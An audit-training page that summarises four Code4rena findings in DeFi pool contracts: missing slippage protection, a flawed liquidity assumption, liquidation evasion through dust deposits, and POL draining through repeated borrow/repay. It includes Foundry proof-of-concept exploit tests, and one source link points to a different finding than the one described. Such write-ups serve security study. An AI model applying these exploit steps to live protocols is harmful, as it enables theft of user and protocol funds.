# ETAAcademy-Adudit: 4. Pool

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>04. Pool</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>DeFi</th>
          <td>pool</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[Medium] Lack of Slippage Protection in withdraw/redeem Functions of the Vault

### Slippage Protection

- Summary: Users in the PrizeVault expect a 1:1 exchange ratio between assets and shares when withdrawing. However, if the underlying yield vault incurs losses, this ratio can decrease. If total assets drop below total debt while a user's withdrawal is pending, they may receive fewer assets than expected, potentially causing losses.

- Impact & Recommendation: The withdraw and redeem functions in the PrizeVault lack slippage protection, potentially leading to user losses if the underlying yield vault experiences losses. To address this, users should be able to specify slippage protection parameters, such as a minimum amount for redemption or a maximum shares input for withdrawal.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-pooltogether#m-04-lack-of-slippage-protection-in-withdrawredeem-functions-of-the-vault) & [Report](https://code4rena.com/reports/2024-03-pooltogether)

  <details><summary>POC</summary>

  ```solidity
    function previewWithdraw(uint256 _assets) public view returns (uint256) {
        uint256 _totalAssets = totalAssets();
        // No withdrawals can occur if the vault controls no assets.
        if (_totalAssets == 0) revert ZeroTotalAssets();
        uint256 totalDebt_ = totalDebt();
        if (_totalAssets >= totalDebt_) {
            return _assets;
        } else {
            // Follows the inverse conversion of `convertToAssets`
            return _assets.mulDiv(totalDebt_, _totalAssets, Math.Rounding.Up);
        }
    }
    function convertToAssets(uint256 _shares) public view returns (uint256) {
        uint256 totalDebt_ = totalDebt();
        uint256 _totalAssets = totalAssets();
        if (_totalAssets >= totalDebt_) {
            return _shares;
        } else {
            // If the vault controls fewer assets than what has been deposited, a share will be worth a
            // proportional amount of the total assets. This can happen due to fees, slippage, or loss
            // of funds in the underlying yield vault.
            return _shares.mulDiv(_totalAssets, totalDebt_, Math.Rounding.Down);
        }
    }
    function totalAssets() public view returns (uint256) {
        return yieldVault.convertToAssets(yieldVault.balanceOf(address(this))) + _asset.balanceOf(address(this));
    }

  ```

  </details>

## 2.[High] ReLPContract wrongfully assumes protocol owns all of the liquidity in the UniswapV2 pool

### Not calculations on the all liquidity

- Summary: The ReLPContract assumes it owns all liquidity in the UniswapV2 pool. When RdpxV2Core calls ReLPContract#reLP, it may pass incorrect amounts or trigger a revert if the protocol doesn't own the majority of LP balance. This is because the calculation assumes protocol owns all RDPX reserves, potentially leading to a denial-of-service if lpToRemove exceeds actual LP balance.

- Impact & Recommendation: Change the logic and base all calculations on the pair balance of `UniV2LiquidityAmo`
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-09-relpcontract-wrongfully-assumes-protocol-owns-all-of-the-liquidity-in-the-uniswapv2-pool) & [Report](https://code4rena.com/reports/2023-08-dopex)

    <details><summary>POC</summary>

  ```solidity
    function testReLpContract() public {
        testV2Amo();
        // set address in reLP contract and grant role
        reLpContract.setAddresses(
            address(rdpx),
            address(weth),
            address(pair),
            address(rdpxV2Core),
            address(rdpxReserveContract),
            address(uniV2LiquidityAMO),
            address(rdpxPriceOracle),
            address(factory),
            address(router)
        );
        reLpContract.grantRole(reLpContract.RDPXV2CORE_ROLE(), address(rdpxV2Core));
        reLpContract.setreLpFactor(9e4);
        // add liquidity
        uniV2LiquidityAMO.addLiquidity(5e18, 1e18, 0, 0);
        uniV2LiquidityAMO.approveContractToSpend(
            address(pair),
            address(reLpContract),
            type(uint256).max
        );
        rdpxV2Core.setIsreLP(true);
        (uint256 reserveA, uint256 reserveB, ) = pair.getReserves();
        weth.mint(address(2), reserveB * 10);
        rdpx.mint(address(2), reserveA * 10);
        vm.startPrank(address(2));
        weth.approve(address(router), reserveB * 10);
        rdpx.approve(address(router), reserveA * 10);
        router.addLiquidity(address(rdpx), address(weth), reserveA * 10, reserveB * 10, 0, 0, address(2), 12731316317831123);
        vm.stopPrank();

        console.log("UniV2Amo balance isn't enough and will underflow");
        uint pairBalance = pair.balanceOf(address(uniV2LiquidityAMO));
        console.log("UniV2Amo LP balance: ", pairBalance);
        vm.expectRevert("ds-math-sub-underflow");
        rdpxV2Core.bond(1 * 1e18, 0, address(this));
    }

  ```

    </details>

## 3.[High] User can evade liquidation by depositing the minimum of tokens and gain time to not be liquidated

### Liquidation by manipulating the user.cooldownExpiration variable

- Summary: The CollateralAndLiquidity contract has a critical vulnerability that lets a user avoid liquidation by manipulating the user.cooldownExpiration variable. By depositing small amounts of tokens, users can increment the cooldownExpiration, causing liquidation attempts to fail. This could lead to system debt if liquidations are avoided.

- Impact & Recommendation: Consider modifying the liquidation function
  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-salty#m-05-absence-of-autonomous-mechanism-for-selling-collateral-assets-in-the-external-market-in-exchange-for-usds-will-cause-undercollateralization-during-market-crashes-and-will-cause-usds-to-depeg) & [Report](https://code4rena.com/reports/2024-01-salty)

  <details><summary>POC</summary>

  ```solidity
  // Filename: src/stable/tests/CollateralAndLiquidity.t.sol:TestCollateral
  // $ forge test --match-test "testUserLiquidationMayBeAvoided" --rpc-url https://yoururl -vv
  //
    function testUserLiquidationMayBeAvoided() public {
        // Liquidatable user can avoid liquidation
        //
        // Have bob deposit so alice can withdraw everything without DUST reserves restriction
        _depositHalfCollateralAndBorrowMax(bob);
        //
        // 1. Alice deposit and borrow the max amount
        // Deposit and borrow for Alice
        _depositHalfCollateralAndBorrowMax(alice);
        // Check if Alice has a position
        assertTrue(_userHasCollateral(alice));
        //
        // 2. Crash the collateral price
        _crashCollateralPrice();
        vm.warp( block.timestamp + 1 days );
        //
        // 3. Alice maliciously front run the liquidation action and deposit a DUST amount
        vm.prank(alice);
        collateralAndLiquidity.depositCollateralAndIncreaseShare(PoolUtils.DUST + 1, PoolUtils.DUST + 1, 0, block.timestamp, false );
        //
        // 4. The function alice liquidation will be reverted by "Must wait for the cooldown to expire"
        vm.expectRevert( "Must wait for the cooldown to expire" );
        collateralAndLiquidity.liquidateUser(alice);
    }

  ```

  </details>

## 4.[High] When borrowers repay USDS, it is sent to the wrong address, allowing anyone to burn Protocol Owned Liquidity and build bad debt for USDS

### Bad debt from liquidations

- Summary: The Liquidizer contract burns USDS collected from users' repayments during upkeep. If there's enough USDS, it's directly burned; otherwise, Protocol Owned Liquidity (POL) is converted to USDS to cover the deficit. However, the usdsThatShouldBeBurned variable is continuously increased without increasing the Liquidizer balance, forcing it to sell POL to cover the increase. If POL is exhausted, the protocol can't cover bad debt from liquidations, negatively impacting the USDS price.

- Impact & Recommendation: An attacker can exploit this by borrowing and repaying multiple times to exhaust POL or gradually over time as users repay their USDS. Therefore consider to Send the repaid USDS to the Liquidizer.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-01-salty#h-06-when-borrowers-repay-usds-it-is-sent-to-the-wrong-address-allowing-anyone-to-burn-protocol-owned-liquidity-and-build-bad-debt-for-usds) & [Report](https://code4rena.com/reports/2024-01-salty)

  <details><summary>POC</summary>

  ```solidity

      function testBurnPOL() public {
        // setup
        vm.prank(address(collateralAndLiquidity));
  	usds.mintTo(address(dao), 20000 ether);
  	vm.prank(address(teamVestingWallet));
  	salt.transfer(address(dao), 10000 ether);
  	vm.prank(DEPLOYER);
  	dai.transfer(address(dao), 10000 ether);
        // create Protocol Owned Liquidity (POL)
        vm.startPrank(address(dao));
  	collateralAndLiquidity.depositLiquidityAndIncreaseShare(salt, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
  	collateralAndLiquidity.depositLiquidityAndIncreaseShare(dai, usds, 10000 ether, 10000 ether, 0, block.timestamp, false );
  	vm.stopPrank();
        bytes32 poolIDA = PoolUtils._poolID(salt, usds);
  	bytes32 poolIDB = PoolUtils._poolID(dai, usds);
  	assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDA), 20000 ether);
  	assertEq( collateralAndLiquidity.userShareForPool(address(dao), poolIDB), 20000 ether);
        // Alice deposits collateral
        vm.startPrank(address(alice));
        wbtc.approve(address(collateralAndLiquidity), type(uint256).max);
        weth.approve(address(collateralAndLiquidity), type(uint256).max);
        collateralAndLiquidity.depositCollateralAndIncreaseShare(wbtc.balanceOf(alice), weth.balanceOf(alice), 0, block.timestamp, true );

        // Alice performs multiple borrows and repayments, increasing the
        // usdsThatShouldBeBurned variable in Liquidizer
        for (uint i; i < 100; i++){
            vm.startPrank(alice);
            uint256 maxUSDS = collateralAndLiquidity.maxBorrowableUSDS(alice);
  	    collateralAndLiquidity.borrowUSDS( maxUSDS );
            uint256 borrowed = collateralAndLiquidity.usdsBorrowedByUsers(alice);
            collateralAndLiquidity.repayUSDS(borrowed);
        }

        vm.startPrank(address(upkeep));
        // perform upkeep multiple times to cover bad debt
        // breaks when POL is exhausted
        for(;;){
            (, uint reserve1) = pools.getPoolReserves(dai, usds);
            if(reserve1 * 99 / 100 < 100) break;
            liquidizer.performUpkeep();
        }
        assertGt(liquidizer.usdsThatShouldBeBurned(), usds.balanceOf(address(liquidizer)));
    }


  ```

  </details>
